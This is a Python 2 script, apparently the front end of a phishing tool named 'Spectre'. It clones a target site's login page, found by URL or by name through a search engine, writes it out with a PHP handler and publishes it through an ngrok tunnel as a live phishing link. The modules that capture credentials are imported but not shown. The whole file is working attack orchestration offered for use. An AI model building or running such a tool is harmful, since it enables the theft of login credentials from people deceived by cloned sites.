# Date: 03/20/2018
# Author: Ethical-H4CK3R
# Description: A Simple site cloner

from time import sleep
from os.path import exists 
from subprocess import call
from lib.ngrok import Phish
from os import remove, mkdir
from urlparse import urlparse
from lib.scrape import Scraper
from lib.modify import Modifier
from argparse import ArgumentParser
from lib.search import Google, Bing, DuckDuckGo

from lib.const import (ENGINES as engines,
                       FOLDER as src_folder,
                       INDEX as html_location,
                       PHP_SCRIPT_FILE as php_file)

class Spectre(object):
 def __init__(self, engine, name, url, javascript):
  self.url = self.get_url(name) if not url else url

  if not self.url:
   exit('[!] Failed to obtain a url')

  call(['clear'])
  print '[+] Cloning: {} ...'.format(self.url)
  sleep(0.5)

  self.modifer = Modifier(Scraper(self.url, javascript).html, self.url)
  self.phish = Phish()
  self.php_file = '{}/{}'.format(src_folder, php_file)

 def get_url(self, name):
  call(['clear'])
  print '[+] Resloving a url for:', name
  sleep(0.5)
  return engine(name).search()

 def start(self, n=2):
  self.write_out(self.modifer.source, self.modifer.php)
  self.phish.start()

  url = self.phish.link 
  sleep(1 if not url else 0.5)
  if not url:
   url = self.phish.link 
  if not url:
   if n:
    self.start(n-1)
   else:exit('[!] Failed to fetch ngrok link, try again')

  call(['clear'])
  print '[+] Site: {}'.format(url)
  print '[-] Press Ctrl-C to quit'
  while 1:
   try:sleep(1)
   except:break
  self.stop()

 def clean_up(self):
  for item in [self.php_file, html_location]:
   try:remove(item)
   except:pass

 def stop(self):
  try:
   print '\n[+] Exiting ...'
   self.phish.stop()
   self.clean_up()
  except:pass

 def write_out(self, html, php):
  with open(self.php_file, 'wt') as f:f.write(php)
  with open(html_location, 'w') as f:
   try:f.write(html.encode('utf8'))
   except:
    try:f.write(html)
    except:exit('[!] Error: Failed to save the file')
 
class CmdLine(object):

 @staticmethod
 def args(): 
  parser = ArgumentParser()

  parser.add_argument('-n',
                      '--name',              
                      help='the name of a website instead of url. \
                       Example: facebook')

  parser.add_argument('-u',
                      '--url',
                      help='url to a site\'s login page. \
                       Example: https://site.com/login')

  parser.add_argument('-e',
                      '--engine',
                      default='google',
                      help='the search engine to search with; Google, Bing, DuckDuckGo. \
                       Example: -e Google')

  parser.add_argument('-js',                      
                      '--javascript', 
                      default=False, 
                      action='store_true',
                      help='scrape a site that uses javascript')
 
  return parser.parse_args()

if __name__ == '__main__':
 if not exists(src_folder):
  mkdir(src_folder)

 user_input = CmdLine.args()

 url = user_input.url 
 name = user_input.name 
 engine = user_input.engine
 javascript = user_input.javascript

 if url:
  url_data = urlparse(url)
  if not url_data.scheme:
   exit('[!] Error: Invalid url, you need a http:// OR https:// OR etc in your url'.format(url))

  if not '.' in url_data.netloc:
   exit('[!] Error: Invalid url, you need a .com OR .org OR etc in your url'.format(url))
 
 # target site 
 if any([all([not url, not name]), all([url, name])]):
  exit('[!] Error: Must provide a valid site name OR a valid url')

 # search engine 
 if not engine.lower() in [_.lower() for _ in engines]:
  exit('[!] Error: `{}` is not a known search engine'.format(engine))

 # set engine 
 engine = engine.lower()
 engine = Bing if engine == 'bing' else Google if engine == 'google' else DuckDuckGo

 # start 
 spectre = Spectre(engine, name, url, javascript)
 spectre.start()